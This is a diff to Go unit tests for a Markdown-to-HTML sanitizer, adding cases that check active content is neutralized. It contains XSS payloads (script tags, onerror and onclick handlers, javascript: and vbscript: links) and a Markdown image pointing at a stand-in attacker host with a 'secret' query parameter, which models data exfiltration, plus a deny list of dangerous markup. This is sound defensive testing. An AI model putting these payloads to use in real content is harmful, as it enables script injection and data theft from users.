@@ -43,7 +43,7 @@ func TestMarkdownHTMLSafety(t *testing.T) {
 			}
 		}
 	}
-	for _, input := range []string{"[safe](https://example.com)", "[safe](http://example.com)", "[safe](mailto:a@example.com)", "https://example.com", "<a@example.com>", "![alt](https://example.com/x.png)"} {
+	for _, input := range []string{"[safe](https://example.com)", "[safe](http://example.com)", "[safe](mailto:a@example.com)", "https://example.com", "<a@example.com>"} {
 		got := MarkdownHTML(input)
 		if !strings.Contains(got, "href=") && !strings.Contains(got, "src=") {
 			t.Errorf("safe link lost: %s", got)
@@ -74,14 +74,21 @@ func TestMarkdownHTMLNeutralizesActiveContent(t *testing.T) {
 		"[v](vbscript:msgbox(1))",
 		"<a href=\"javascript:alert(1)\">a</a>",
 		"| a |\n|---|\n| <b onclick=alert(1)>x</b> |",
+		"[&lt;img src=x onerror=alert(1)&gt;](javascript:x)",
+		"[&lt;script&gt;alert(1)&lt;/script&gt;](ftp://x)",
+		"![exfil](https://attacker.example/p.png?d=secret)",
 	} {
 		got := strings.ToLower(MarkdownHTML(input))
-		// Dangerous URLs may remain as visible text, never as an attribute.
-		for _, bad := range []string{"<script", "onerror=", "onclick=", "href=\"javascript", "src=\"javascript", "href=\"vbscript", "<img src=x"} {
+		// Dangerous URLs and markup may remain as escaped visible text, never as
+		// a tag or attribute.
+		for _, bad := range []string{"<script", "<img", "<b ", "href=\"javascript", "src=\"javascript", "href=\"vbscript"} {
 			if strings.Contains(got, bad) {
 				t.Errorf("%q rendered %q (contains %q)", input, got, bad)
 			}
 		}
+	}
+	if got := MarkdownHTML("![exfil](https://attacker.example/p.png)"); strings.Contains(got, "<img") {
+		t.Errorf("remote image rendered: %q", got)
 	}
 	if got := MarkdownHTML("[ok](https://example.com)"); !strings.Contains(got, `href="https://example.com"`) {
 		t.Errorf("safe link dropped: %q", got)
